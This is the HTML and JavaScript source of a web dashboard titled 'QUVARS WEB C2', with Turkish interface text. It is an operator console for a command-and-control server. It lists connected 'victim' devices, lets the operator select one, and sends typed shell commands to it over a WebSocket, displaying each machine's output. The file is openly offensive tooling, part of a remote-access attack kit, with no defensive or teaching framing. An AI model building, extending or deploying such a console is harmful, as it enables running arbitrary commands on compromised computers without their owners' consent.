<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>QUVARS WEB C2 - DASHBOARD</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #0a0a0b; --panel: #111112; --accent: #00ff88; --danger: #ff4b2b; --text: #f0f0f0; --border: rgba(255,255,255,0.08); }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Outfit', sans-serif; }
        body { background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; }

        /* Sidebar: Cihaz Listesi */
        #sidebar { width: 260px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
        .sidebar-header { padding: 20px; font-weight: 600; font-size: 1.2rem; color: var(--accent); border-bottom: 1px solid var(--border); }
        #victim-list { flex: 1; overflow-y: auto; padding: 10px; }
        .victim-item { padding: 12px; border-radius: 8px; margin-bottom: 8px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; background: rgba(255,255,255,0.02); }
        .victim-item:hover { background: rgba(0, 255, 136, 0.05); border-color: var(--accent); }
        .victim-item.active { background: var(--accent); color: #000; font-weight: 600; }

        /* Main Content: Terminal Alanı */
        #main { flex: 1; display: flex; flex-direction: column; padding: 20px; }
        #shell-container { flex: 1; background: #000; border-radius: 12px; border: 1px solid var(--border); display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        #shell-header { padding: 10px 20px; background: #111; font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; }
        #shell-out { flex: 1; padding: 20px; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.95rem; white-space: pre-wrap; color: #00ff88; }
        
        /* Input Alanı */
        #input-area { display: flex; background: #111; padding: 15px; border-top: 1px solid var(--border); }
        #shell-inp { flex: 1; background: transparent; border: none; color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 1rem; padding: 5px; }
        .status-dot { width: 10px; height: 10px; background: var(--accent); border-radius: 50%; display: inline-block; margin-right: 5px; }
    </style>
</head>
<body>

<div id="sidebar">
    <div class="sidebar-header">QUVARS WEB C2</div>
    <div id="victim-list">
        </div>
</div>

<div id="main">
    <div id="shell-container">
        <div id="shell-header">
            <span><span class="status-dot"></span> TERMINAL - <span id="target-id">Lütfen bir cihaz seçin</span></span>
            <span style="opacity: 0.5;">QUVARS V1.0</span>
        </div>
        <div id="shell-out">Bağlantı bekleniyor...</div>
        <div id="input-area">
            <span style="color: var(--accent); margin-right: 10px;">$</span>
            <input type="text" id="shell-inp" placeholder="Komut yazın ve Enter'a basın..." autofocus>
        </div>
    </div>
</div>

<script>
    let selectedId = null;
    const socket = new WebSocket("ws://localhost:8080/ws");

    socket.onopen = () => {
        document.getElementById('shell-out').innerHTML = "[+] Sunucuya bağlandı. Cihaz bekleniyor...\n";
    };

    socket.onmessage = (event) => {
        const msg = JSON.parse(event.data);
        
        if (msg.type === "list") {
            const listDiv = document.getElementById('victim-list');
            listDiv.innerHTML = "";
            msg.data.forEach(client => {
                const item = document.createElement('div');
                item.className = 'victim-item' + (selectedId === client.id ? ' active' : '');
                item.innerHTML = `ID: ${client.id}<br><small>${client.info}</small>`;
                item.onclick = () => {
                    selectedId = client.id;
                    document.getElementById('target-id').innerText = "ID: " + selectedId;
                    updateListUI();
                    document.getElementById('shell-out').innerHTML += `\n[*] Hedef seçildi: ${client.id}\n`;
                };
                listDiv.appendChild(item);
            });
        } else if (msg.type === "output") {
            if (msg.id === selectedId) {
                const out = document.getElementById('shell-out');
                out.innerText += msg.data;
                out.scrollTop = out.scrollHeight;
            }
        }
    };

    function updateListUI() {
        const items = document.querySelectorAll('.victim-item');
        items.forEach(item => {
            if (item.innerText.includes("ID: " + selectedId)) {
                item.classList.add('active');
            } else {
                item.classList.remove('active');
            }
        });
    }

    document.getElementById('shell-inp').addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            const cmd = this.value;
            if (!selectedId) {
                alert("Lütfen önce listeden bir cihaz seçin!");
                return;
            }
            if (cmd) {
                socket.send(JSON.stringify({ id: selectedId, command: cmd }));
                this.value = "";
            }
        }
    });
</script>

</body>
</html>